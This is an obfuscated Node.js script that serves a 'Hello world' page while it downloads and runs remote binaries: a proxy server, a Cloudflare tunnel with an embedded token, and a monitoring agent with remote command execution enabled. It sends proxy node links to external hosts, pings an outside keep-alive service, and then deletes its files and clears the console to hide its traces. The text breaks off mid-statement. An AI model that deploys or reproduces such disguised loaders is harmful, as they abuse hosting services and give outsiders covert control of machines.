const _0x23a97a=_0xf1dd;(function(_0x44ac29,_0x3b0bf7){const _0x34719f=_0xf1dd,_0x494ad6=_0x44ac29();while(!![]){try{const _0x5eeb63=parseInt(_0x34719f(0x12f))/0x1+-parseInt(_0x34719f(0xee))/0x2*(parseInt(_0x34719f(0x131))/0x3)+parseInt(_0x34719f(0x103))/0x4*(-parseInt(_0x34719f(0xcb))/0x5)+parseInt(_0x34719f(0xf2))/0x6*(parseInt(_0x34719f(0x117))/0x7)+-parseInt(_0x34719f(0xd9))/0x8*(-parseInt(_0x34719f(0xbd))/0x9)+-parseInt(_0x34719f(0xe8))/0xa+-parseInt(_0x34719f(0xc6))/0xb*(-parseInt(_0x34719f(0xdf))/0xc);if(_0x5eeb63===_0x3b0bf7)break;else _0x494ad6['push'](_0x494ad6['shift']());}catch(_0x58449d){_0x494ad6['push'](_0x494ad6['shift']());}}}(_0x590d,0x5a0a5));const express=require(_0x23a97a(0x12e)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x23a97a(0x129)),exec=promisify(require('child_process')[_0x23a97a(0x16e)]),{execSync}=require(_0x23a97a(0xeb)),UPLOAD_URL=process[_0x23a97a(0x14c)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x23a97a(0x14c)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x23a97a(0x14c)][_0x23a97a(0x15f)]||![],FILE_PATH=process[_0x23a97a(0x14c)]['FILE_PATH']||_0x23a97a(0x12d),SUB_PATH=process[_0x23a97a(0x14c)][_0x23a97a(0x154)]||_0x23a97a(0x140),PORT=process[_0x23a97a(0x14c)]['SERVER_PORT']||process[_0x23a97a(0x14c)]['PORT']||0x1f90,KAMAN=process[_0x23a97a(0x14c)]['KAMAN']||'2bb7df19-3b77-4640-bcc9-b2caafd84b6e',YOUNGHERO_SERVER=process[_0x23a97a(0x14c)][_0x23a97a(0x169)]||_0x23a97a(0xc5),YOUNGHERO_PORT=process[_0x23a97a(0x14c)][_0x23a97a(0x14a)]||'',YOUNGHERO_KEY=process[_0x23a97a(0x14c)]['YOUNGHERO_KEY']||_0x23a97a(0xea),SUIDAO_DOMAIN=process[_0x23a97a(0x14c)][_0x23a97a(0x126)]||'scaleway.kaixa.xx.kg',SUIDAO_AUTH=process[_0x23a97a(0x14c)]['SUIDAO_AUTH']||'eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiNDExYWYzNWUtODMxOC00M2QzLTk4NjYtMjdlMzc3NjU3Y2QwIiwicyI6Ik1EYzFPVGxtWldZdE5XVTNZUzAwWkdJNExXSXlNVEl0Wm1RNE9XVXlObVpoTmpaaiJ9',SUIDAO_PORT=process['env'][_0x23a97a(0x10f)]||0x26ad,CFIP=process[_0x23a97a(0x14c)]['CFIP']||_0x23a97a(0x13e),CFPORT=process['env'][_0x23a97a(0xf4)]||0x1bb,NAME=process['env']['NAME']||_0x23a97a(0x114);!fs['existsSync'](FILE_PATH)?(fs[_0x23a97a(0x127)](FILE_PATH),console[_0x23a97a(0x14d)](FILE_PATH+_0x23a97a(0x11a))):console[_0x23a97a(0x14d)](FILE_PATH+_0x23a97a(0x123));function generateRandomName(){const _0x487d24=_0x23a97a,_0x2f3df9=_0x487d24(0x113);let _0x19f4a1='';for(let _0xf76370=0x0;_0xf76370<0x6;_0xf76370++){_0x19f4a1+=_0x2f3df9[_0x487d24(0x13a)](Math[_0x487d24(0xe5)](Math['random']()*_0x2f3df9[_0x487d24(0x10c)]));}return _0x19f4a1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x23a97a(0xe0)](FILE_PATH,npmName),phpPath=path[_0x23a97a(0xe0)](FILE_PATH,phpName),webPath=path[_0x23a97a(0xe0)](FILE_PATH,webName),botPath=path[_0x23a97a(0xe0)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x23a97a(0xe0)](FILE_PATH,_0x23a97a(0x167)),bootLogPath=path[_0x23a97a(0xe0)](FILE_PATH,_0x23a97a(0xda)),configPath=path['join'](FILE_PATH,_0x23a97a(0xc0));function deleteNodes(){const _0x5adcfc=_0x23a97a;try{if(!UPLOAD_URL)return;if(!fs[_0x5adcfc(0x13c)](subPath))return;let _0x5e41d3;try{_0x5e41d3=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x1557f4=Buffer[_0x5adcfc(0xdd)](_0x5e41d3,_0x5adcfc(0xe1))[_0x5adcfc(0x124)](_0x5adcfc(0x15c)),_0x14704c=_0x1557f4['split']('\x0a')['filter'](_0x5ba88d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5adcfc(0x101)](_0x5ba88d));if(_0x14704c[_0x5adcfc(0x10c)]===0x0)return;return axios[_0x5adcfc(0xe2)](UPLOAD_URL+_0x5adcfc(0x13b),JSON[_0x5adcfc(0x15a)]({'nodes':_0x14704c}),{'headers':{'Content-Type':_0x5adcfc(0x168)}})['catch'](_0x12a0ac=>{return null;}),null;}catch(_0x1f7c83){return null;}}function _0xf1dd(_0x2e6691,_0x474ee4){const _0x590dc6=_0x590d();return _0xf1dd=function(_0xf1dd3f,_0x46c934){_0xf1dd3f=_0xf1dd3f-0xbc;let _0x5435a3=_0x590dc6[_0xf1dd3f];return _0x5435a3;},_0xf1dd(_0x2e6691,_0x474ee4);}function cleanupOldFiles(){const _0x58c73a=_0x23a97a;try{const _0x3ac8fc=fs[_0x58c73a(0x135)](FILE_PATH);_0x3ac8fc[_0x58c73a(0x153)](_0x2f5532=>{const _0x188316=_0x58c73a,_0x5b3bb1=path[_0x188316(0xe0)](FILE_PATH,_0x2f5532);try{const _0x5c1c7e=fs[_0x188316(0xf9)](_0x5b3bb1);_0x5c1c7e['isFile']()&&fs['unlinkSync'](_0x5b3bb1);}catch(_0x597dce){}});}catch(_0x1eb3f9){}}app[_0x23a97a(0xc2)]('/',function(_0x95721a,_0x46704a){const _0xdf9d74=_0x23a97a,_0x1438b7=path[_0xdf9d74(0xe0)](__dirname,'app.html');fs['existsSync'](_0x1438b7)?_0x46704a[_0xdf9d74(0x100)](_0x1438b7):_0x46704a[_0xdf9d74(0x108)]('Hello\x20world!');});function _0x590d(){const _0x30d703=['existsSync','includes','cdns.doon.eu.org','quic','sub','Download\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20>\x20nul\x202>&1','push','https://amd64.ssss.nyc.mn/agent','nohup\x20','https+local://8.8.8.8/dns-query','has','YOUNGHERO_PORT','tcp','env','log','2053','--tls','&path=%2Fvless-suidao%3Fed%3D2560#','https://arm64.ssss.nyc.mn/v1','arm64','forEach','SUB_PATH','Error\x20in\x20startserver:','SUIDAO_DOMAIN:','taskkill\x20/f\x20/im\x20','Error\x20reading\x20boot.log:','writeFileSync','stringify','Content-Type','utf-8','split','chmod','AUTO_ACCESS','/sub.txt\x20saved\x20successfully','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','pipe','tls','Nodes\x20uploaded\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','\x20successfully','list.txt','application/json','YOUNGHERO_SERVER','firefox','response','none','2087','exec','match','Empowerment\x20failed\x20for\x20','direct','text/plain;\x20charset=utf-8','error','/trojan-suidao','platform','27rHXPGF','filter','createWriteStream','config.json','trim','get','https://arm64.ssss.nyc.mn/web','\x22\x20>\x20/dev/null\x202>&1','nzag.faiz.us.kg:8008','7073RQeIXv','npm\x20running\x20error:\x20','\x20-c\x20\x22','freedom','catch','14060SuWMhG','\x0a\x20\x20\x20\x20','\x20-p\x20','\x0aclient_secret:\x20','fileUrl','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','SuidaoDomain:','arch','/vmess-suidao?ed=2560','/vless-suidao','tunnel.json','/dev/null','\x0a\x20\x20\x0avmess://','vmess','1527288aCHGoD','boot.log','rm\x20-rf\x20','unshift','from','\x20>/dev/null\x202>&1\x20&','7356cDTGee','join','base64','post','/tunnel.yml\x20run','status','floor','basename','pop','4557610keKdqY','vless','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','child_process','http','win32','10DAgkep','false','close','https://arm64.ssss.nyc.mn/bot','6222fELGxi','https://arm64.ssss.nyc.mn/agent','CFPORT','\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','all','statSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','readFileSync','Error\x20executing\x20command:\x20','\x0a\x20\x20tunnel:\x20','\x0a\x20\x20credentials-file:\x20','fileName','sendFile','test','amd','592bzXNdB','aarch64','config.yaml','Subscription\x20uploaded\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','send','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','127.0.0.1','2083','length','&path=%2Ftrojan-suidao%3Fed%3D2560#','2096','SUIDAO_PORT','?encryption=none&security=tls&sni=','then','/api/add-nodes','abcdefghijklmnopqrstuvwxyz','Scaleway-PL','clear','.exe\x20>\x20nul\x202>&1','4249mVRmhA','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20is\x20created','arm','App\x20is\x20running','Error\x20downloading\x20files:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','data','https://oooo.serv00.net/add-url','message','substring','\x20already\x20exists','toString','Unhandled\x20error\x20in\x20startserver:','SUIDAO_DOMAIN','mkdirSync','https://amd64.ssss.nyc.mn/web','util','&fp=firefox&type=ws&host=','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20failed:\x20','./tmp','express','92361AJVdBA','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','268782ABFGUB','map','trojan','https://amd64.ssss.nyc.mn/bot','readdirSync','/api/add-subscriptions','/vmess-suidao','\x20>/dev/null\x202>&1','Empowerment\x20success\x20for\x20','charAt','/api/delete-nodes'];_0x590d=function(){return _0x30d703;};return _0x590d();}async function generateConfig(){const _0x3bbc30=_0x23a97a,_0x2fa4b5={'log':{'access':_0x3bbc30(0xd6),'error':_0x3bbc30(0xd6),'loglevel':_0x3bbc30(0x16c)},'inbounds':[{'port':SUIDAO_PORT,'protocol':'vless','settings':{'clients':[{'id':KAMAN,'flow':'xtls-rprx-vision'}],'decryption':_0x3bbc30(0x16c),'fallbacks':[{'dest':0xbb9},{'path':_0x3bbc30(0xd4),'dest':0xbba},{'path':_0x3bbc30(0x137),'dest':0xbbb},{'path':'/trojan-suidao','dest':0xbbc}]},'streamSettings':{'network':_0x3bbc30(0x14b)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3bbc30(0xe9),'settings':{'clients':[{'id':KAMAN}],'decryption':'none'},'streamSettings':{'network':_0x3bbc30(0x14b),'security':_0x3bbc30(0x16c)}},{'port':0xbba,'listen':_0x3bbc30(0x10a),'protocol':_0x3bbc30(0xe9),'settings':{'clients':[{'id':KAMAN,'level':0x0}],'decryption':_0x3bbc30(0x16c)},'streamSettings':{'network':'ws','security':_0x3bbc30(0x16c),'wsSettings':{'path':'/vless-suidao'}},'sniffing':{'enabled':!![],'destOverride':[_0x3bbc30(0xec),_0x3bbc30(0x163),_0x3bbc30(0x13f)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3bbc30(0xd8),'settings':{'clients':[{'id':KAMAN,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3bbc30(0x137)}},'sniffing':{'enabled':!![],'destOverride':[_0x3bbc30(0xec),'tls',_0x3bbc30(0x13f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3bbc30(0x10a),'protocol':_0x3bbc30(0x133),'settings':{'clients':[{'password':KAMAN}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3bbc30(0x174)}},'sniffing':{'enabled':!![],'destOverride':[_0x3bbc30(0xec),_0x3bbc30(0x163),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x3bbc30(0x148)]},'outbounds':[{'protocol':_0x3bbc30(0xc9),'tag':_0x3bbc30(0x171)},{'protocol':'blackhole','tag':'block'}]};fs[_0x3bbc30(0x159)](path['join'](FILE_PATH,_0x3bbc30(0xc0)),JSON[_0x3bbc30(0x15a)](_0x2fa4b5,null,0x2));}function getSystemArchitecture(){const _0x1b508d=_0x23a97a,_0x437157=os[_0x1b508d(0xd2)]();return _0x437157==='arm'||_0x437157===_0x1b508d(0x152)||_0x437157===_0x1b508d(0x104)?'arm':_0x1b508d(0x102);}function downloadFile(_0x3c7e50,_0x3223f3,_0xc3fd31){const _0x31e08e=_0x23a97a,_0x430206=_0x3c7e50;!fs['existsSync'](FILE_PATH)&&fs[_0x31e08e(0x127)](FILE_PATH,{'recursive':!![]});const _0xe604e7=fs[_0x31e08e(0xbf)](_0x430206);axios({'method':_0x31e08e(0xc2),'url':_0x3223f3,'responseType':'stream'})[_0x31e08e(0x111)](_0x3fc2ab=>{const _0x23db31=_0x31e08e;_0x3fc2ab[_0x23db31(0x11f)][_0x23db31(0x162)](_0xe604e7),_0xe604e7['on']('finish',()=>{const _0x134201=_0x23db31;_0xe604e7[_0x134201(0xf0)](),console['log'](_0x134201(0x141)+path[_0x134201(0xe6)](_0x430206)+_0x134201(0x166)),_0xc3fd31(null,_0x430206);}),_0xe604e7['on']('error',_0x2c8f64=>{const _0x58fb6e=_0x23db31;fs['unlink'](_0x430206,()=>{});const _0x218b00='Download\x20'+path[_0x58fb6e(0xe6)](_0x430206)+_0x58fb6e(0x12c)+_0x2c8f64[_0x58fb6e(0x121)];console[_0x58fb6e(0x173)](_0x218b00),_0xc3fd31(_0x218b00);});})[_0x31e08e(0xca)](_0x399c91=>{const _0x169262=_0x31e08e,_0x139120=_0x169262(0x141)+path[_0x169262(0xe6)](_0x430206)+_0x169262(0x12c)+_0x399c91[_0x169262(0x121)];console['error'](_0x139120),_0xc3fd31(_0x139120);});}async function downloadFilesAndRun(){const _0x3f0d27=_0x23a97a,_0x47fc9c=getSystemArchitecture(),_0x5e2b2d=getFilesForArchitecture(_0x47fc9c);if(_0x5e2b2d['length']===0x0){console[_0x3f0d27(0x14d)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x462853=_0x5e2b2d[_0x3f0d27(0x132)](_0x24c27c=>{return new Promise((_0x3e5fb0,_0x4e4b15)=>{const _0x4a45b4=_0xf1dd;downloadFile(_0x24c27c[_0x4a45b4(0xff)],_0x24c27c[_0x4a45b4(0xcf)],(_0xc7a437,_0x3549a9)=>{_0xc7a437?_0x4e4b15(_0xc7a437):_0x3e5fb0(_0x3549a9);});});});try{await Promise[_0x3f0d27(0xf8)](_0x462853);}catch(_0x50ed26){console[_0x3f0d27(0x173)](_0x3f0d27(0x11d),_0x50ed26);return;}function _0x5e23ee(_0x50bfb7){const _0x3fd3d2=0x1fd;_0x50bfb7['forEach'](_0x5dadc8=>{const _0x5a64e5=_0xf1dd;fs[_0x5a64e5(0x13c)](_0x5dadc8)&&fs[_0x5a64e5(0x15e)](_0x5dadc8,_0x3fd3d2,_0x2517a4=>{const _0x37ce3e=_0x5a64e5;_0x2517a4?console[_0x37ce3e(0x173)](_0x37ce3e(0x170)+_0x5dadc8+':\x20'+_0x2517a4):console[_0x37ce3e(0x14d)](_0x37ce3e(0x139)+_0x5dadc8+':\x20'+_0x3fd3d2['toString'](0x8));});});}const _0x1caea7=YOUNGHERO_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5e23ee(_0x1caea7);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x168f56=YOUNGHERO_SERVER['includes'](':')?YOUNGHERO_SERVER[_0x3f0d27(0x15d)](':')[_0x3f0d27(0xe7)]():'',_0x2ac2c4=new Set(['443','8443',_0x3f0d27(0x10e),_0x3f0d27(0x16d),_0x3f0d27(0x10b),_0x3f0d27(0x14e)]),_0x1e9ac5=_0x2ac2c4[_0x3f0d27(0x149)](_0x168f56)?'true':_0x3f0d27(0xef),_0x49069a=_0x3f0d27(0xce)+YOUNGHERO_KEY+_0x3f0d27(0x130)+YOUNGHERO_SERVER+_0x3f0d27(0x142)+_0x1e9ac5+_0x3f0d27(0x107)+KAMAN;fs[_0x3f0d27(0x159)](path[_0x3f0d27(0xe0)](FILE_PATH,_0x3f0d27(0x105)),_0x49069a);const _0x1e1d48=_0x3f0d27(0x147)+phpPath+_0x3f0d27(0xc8)+FILE_PATH+_0x3f0d27(0x11e);try{await exec(_0x1e1d48),console[_0x3f0d27(0x14d)](phpName+_0x3f0d27(0xf5)),await new Promise(_0x2452e1=>setTimeout(_0x2452e1,0x3e8));}catch(_0x535207){console[_0x3f0d27(0x173)]('php\x20running\x20error:\x20'+_0x535207);}}else{let _0x27bdf0='';const _0x41674b=['443','8443','2096',_0x3f0d27(0x16d),_0x3f0d27(0x10b),_0x3f0d27(0x14e)];_0x41674b[_0x3f0d27(0x13d)](YOUNGHERO_PORT)&&(_0x27bdf0=_0x3f0d27(0x14f));const _0x5a60e8=_0x3f0d27(0x147)+npmPath+'\x20-s\x20'+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0x3f0d27(0xcd)+YOUNGHERO_KEY+'\x20'+_0x27bdf0+_0x3f0d27(0x118);try{await exec(_0x5a60e8),console[_0x3f0d27(0x14d)](npmName+'\x20is\x20running'),await new Promise(_0x250db9=>setTimeout(_0x250db9,0x3e8));}catch(_0x443751){console[_0x3f0d27(0x173)](_0x3f0d27(0xc7)+_0x443751);}}}else console[_0x3f0d27(0x14d)]('YOUNGHERO\x20variable\x20is\x20empty,skip\x20running');const _0xad088d=_0x3f0d27(0x147)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xad088d),console['log'](webName+_0x3f0d27(0xf5)),await new Promise(_0x3781e3=>setTimeout(_0x3781e3,0x3e8));}catch(_0x158dc5){console[_0x3f0d27(0x173)]('web\x20running\x20error:\x20'+_0x158dc5);}if(fs['existsSync'](botPath)){let _0x4abbae;if(SUIDAO_AUTH[_0x3f0d27(0x16f)](/^[A-Z0-9a-z=]{120,250}$/))_0x4abbae=_0x3f0d27(0xd0)+SUIDAO_AUTH;else SUIDAO_AUTH[_0x3f0d27(0x16f)](/TunnelSecret/)?_0x4abbae=_0x3f0d27(0x119)+FILE_PATH+_0x3f0d27(0xe3):_0x4abbae=_0x3f0d27(0xf6)+FILE_PATH+_0x3f0d27(0xfa)+SUIDAO_PORT;try{await exec(_0x3f0d27(0x147)+botPath+'\x20'+_0x4abbae+_0x3f0d27(0xde)),console['log'](botName+_0x3f0d27(0xf5)),await new Promise(_0x9965a=>setTimeout(_0x9965a,0x7d0));}catch(_0x17e134){console['error'](_0x3f0d27(0xfc)+_0x17e134);}}await new Promise(_0x475dcf=>setTimeout(_0x475dcf,0x1388));}function getFilesForArchitecture(_0x672669){const _0x28943f=_0x23a97a;let _0x166f1c;_0x672669===_0x28943f(0x11b)?_0x166f1c=[{'fileName':webPath,'fileUrl':_0x28943f(0xc3)},{'fileName':botPath,'fileUrl':_0x28943f(0xf1)}]:_0x166f1c=[{'fileName':webPath,'fileUrl':_0x28943f(0x128)},{'fileName':botPath,'fileUrl':_0x28943f(0x134)}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x4bef7e=_0x672669===_0x28943f(0x11b)?_0x28943f(0xf3):_0x28943f(0x146);_0x166f1c[_0x28943f(0xdc)]({'fileName':npmPath,'fileUrl':_0x4bef7e});}else{const _0x5dbbc3=_0x672669==='arm'?_0x28943f(0x151):'https://amd64.ssss.nyc.mn/v1';_0x166f1c['unshift']({'fileName':phpPath,'fileUrl':_0x5dbbc3});}}return _0x166f1c;}function suidaoType(){const _0x1b33b0=_0x23a97a;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console['log']('SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(SUIDAO_AUTH[_0x1b33b0(0x13d)]('TunnelSecret')){fs[_0x1b33b0(0x159)](path[_0x1b33b0(0xe0)](FILE_PATH,_0x1b33b0(0xd5)),SUIDAO_AUTH);const _0x8eb439=_0x1b33b0(0xfd)+SUIDAO_AUTH[_0x1b33b0(0x15d)]('\x22')[0xb]+_0x1b33b0(0xfe)+path[_0x1b33b0(0xe0)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+SUIDAO_DOMAIN+_0x1b33b0(0x12b)+SUIDAO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1b33b0(0x159)](path[_0x1b33b0(0xe0)](FILE_PATH,'tunnel.yml'),_0x8eb439);}else console['log'](_0x1b33b0(0xf7));}suidaoType();async function extractDomains(){const _0x425a9b=_0x23a97a;let _0xef5755;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0xef5755=SUIDAO_DOMAIN,console[_0x425a9b(0x14d)](_0x425a9b(0x156),_0xef5755),await _0x18d52b(_0xef5755);else try{const _0x4c1bc5=fs['readFileSync'](path[_0x425a9b(0xe0)](FILE_PATH,_0x425a9b(0xda)),_0x425a9b(0x15c)),_0x42b616=_0x4c1bc5[_0x425a9b(0x15d)]('\x0a'),_0x52cf9f=[];_0x42b616[_0x425a9b(0x153)](_0x56c2b2=>{const _0x67c824=_0x425a9b,_0x598b88=_0x56c2b2[_0x67c824(0x16f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x598b88){const _0x15a756=_0x598b88[0x1];_0x52cf9f['push'](_0x15a756);}});if(_0x52cf9f['length']>0x0)_0xef5755=_0x52cf9f[0x0],console[_0x425a9b(0x14d)](_0x425a9b(0xd1),_0xef5755),await _0x18d52b(_0xef5755);else{console[_0x425a9b(0x14d)]('SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain'),fs['unlinkSync'](path[_0x425a9b(0xe0)](FILE_PATH,_0x425a9b(0xda)));async function _0x3f992a(){const _0x30bfdc=_0x425a9b;try{process[_0x30bfdc(0xbc)]==='win32'?await exec(_0x30bfdc(0x157)+botName+_0x30bfdc(0x116)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x30bfdc(0x122)](0x1)+_0x30bfdc(0xc4));}catch(_0x38a40d){}}_0x3f992a(),await new Promise(_0x4249fb=>setTimeout(_0x4249fb,0xbb8));const _0x522f58=_0x425a9b(0xf6)+FILE_PATH+_0x425a9b(0xfa)+SUIDAO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x522f58+_0x425a9b(0xde)),console[_0x425a9b(0x14d)](botName+_0x425a9b(0xf5)),await new Promise(_0x20de6c=>setTimeout(_0x20de6c,0xbb8)),await extractDomains();}catch(_0xab47d8){console[_0x425a9b(0x173)](_0x425a9b(0xfc)+_0xab47d8);}}}catch(_0x28b957){console[_0x425a9b(0x173)](_0x425a9b(0x158),_0x28b957);}async function _0x18d52b(_0x5c4eb5){const _0x3f12c2=_0x425a9b,_0x33c4f5=execSync(_0x3f12c2(0x161),{'encoding':_0x3f12c2(0x15c)}),_0x168e3e=_0x33c4f5[_0x3f12c2(0xc1)](),_0x2bcd67=NAME?NAME+'-'+_0x168e3e:_0x168e3e;return new Promise(_0x1f2de8=>{setTimeout(()=>{const _0x15a7a3=_0xf1dd,_0x21a8f5={'v':'2','ps':''+_0x2bcd67,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':_0x15a7a3(0x16c),'net':'ws','type':'none','host':_0x5c4eb5,'path':_0x15a7a3(0xd3),'tls':_0x15a7a3(0x163),'sni':_0x5c4eb5,'alpn':'','fp':_0x15a7a3(0x16a)},_0xb00bcc='\x0avless://'+KAMAN+'@'+CFIP+':'+CFPORT+_0x15a7a3(0x110)+_0x5c4eb5+_0x15a7a3(0x12a)+_0x5c4eb5+_0x15a7a3(0x150)+_0x2bcd67+_0x15a7a3(0xd7)+Buffer[_0x15a7a3(0xdd)](JSON[_0x15a7a3(0x15a)](_0x21a8f5))[_0x15a7a3(0x124)]('base64')+'\x0a\x20\x20\x0atrojan://'+KAMAN+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x5c4eb5+_0x15a7a3(0x12a)+_0x5c4eb5+_0x15a7a3(0x10d)+_0x2bcd67+_0x15a7a3(0xcc);console[_0x15a7a3(0x14d)](Buffer['from'](_0xb00bcc)['toString']('base64')),fs['writeFileSync'](subPath,Buffer[_0x15a7a3(0xdd)](_0xb00bcc)[_0x15a7a3(0x124)]('base64')),console['log'](FILE_PATH+_0x15a7a3(0x160)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x28b4cd,_0x2aec93)=>{const _0x368b2b=_0x15a7a3,_0x502b06=Buffer[_0x368b2b(0xdd)](_0xb00bcc)['toString'](_0x368b2b(0xe1));_0x2aec93['set'](_0x368b2b(0x15b),_0x368b2b(0x172)),_0x2aec93[_0x368b2b(0x108)](_0x502b06);}),_0x1f2de8(_0xb00bcc);},0x7d0);});}}async function uploadNodes(){const _0x3fd42b=_0x23a97a;if(UPLOAD_URL&&PROJECT_URL){const _0x24dc9a=PROJECT_URL+'/'+SUB_PATH,_0x1a3597={'subscription':[_0x24dc9a]};try{const _0x338db3=await axios[_0x3fd42b(0xe2)](UPLOAD_URL+_0x3fd42b(0x136),_0x1a3597,{'headers':{'Content-Type':_0x3fd42b(0x168)}});return _0x338db3&&_0x338db3[_0x3fd42b(0xe4)]===0xc8?(console['log'](_0x3fd42b(0x106)),_0x338db3):null;}catch(_0x507239){if(_0x507239[_0x3fd42b(0x16b)]){if(_0x507239[_0x3fd42b(0x16b)][_0x3fd42b(0xe4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3fd42b(0x13c)](listPath))return;const _0x487407=fs[_0x3fd42b(0xfb)](listPath,_0x3fd42b(0x15c)),_0xda5baf=_0x487407['split']('\x0a')[_0x3fd42b(0xbe)](_0x308b31=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3fd42b(0x101)](_0x308b31));if(_0xda5baf[_0x3fd42b(0x10c)]===0x0)return;const _0x5c3c16=JSON[_0x3fd42b(0x15a)]({'nodes':_0xda5baf});try{const _0x4ed50f=await axios[_0x3fd42b(0xe2)](UPLOAD_URL+_0x3fd42b(0x112),_0x5c3c16,{'headers':{'Content-Type':_0x3fd42b(0x168)}});return _0x4ed50f&&_0x4ed50f[_0x3fd42b(0xe4)]===0xc8?(console['log'](_0x3fd42b(0x164)),_0x4ed50f):null;}catch(_0x531d3e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x917540=_0xf1dd,_0x112dc5=[bootLogPath,configPath,webPath,botPath];if(YOUNGHERO_PORT)_0x112dc5[_0x917540(0x145)](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x112dc5[_0x917540(0x145)](phpPath);process['platform']===_0x917540(0xed)?exec('del\x20/f\x20/q\x20'+_0x112dc5[_0x917540(0xe0)]('\x20')+_0x917540(0x144),_0x4e42c9=>{const _0x3266a1=_0x917540;console[_0x3266a1(0x115)](),console[_0x3266a1(0x14d)](_0x3266a1(0x11c)),console[_0x3266a1(0x14d)](_0x3266a1(0x109));}):exec(_0x917540(0xdb)+_0x112dc5[_0x917540(0xe0)]('\x20')+_0x917540(0x138),_0x4652c6=>{const _0x5d5eeb=_0x917540;console['clear'](),console[_0x5d5eeb(0x14d)](_0x5d5eeb(0x11c)),console['log'](_0x5d5eeb(0x109));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3f0535=_0x23a97a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3f0535(0x14d)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x359a1a=await axios[_0x3f0535(0xe2)](_0x3f0535(0x120),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3f0535(0x168)}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x359a1a;}catch(_0x49e898){return console['error'](_0x3f0535(0x143)+_0x49e898['message']),null;}}async function startserver(){const _0x30aefd=_0x23a97a;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x36095e){console[_0x30aefd(0x173)](_0x30aefd(0x155),_0x36095e);}}startserver()[_0x23a97a(0xca)](_0x358ca9=>{const 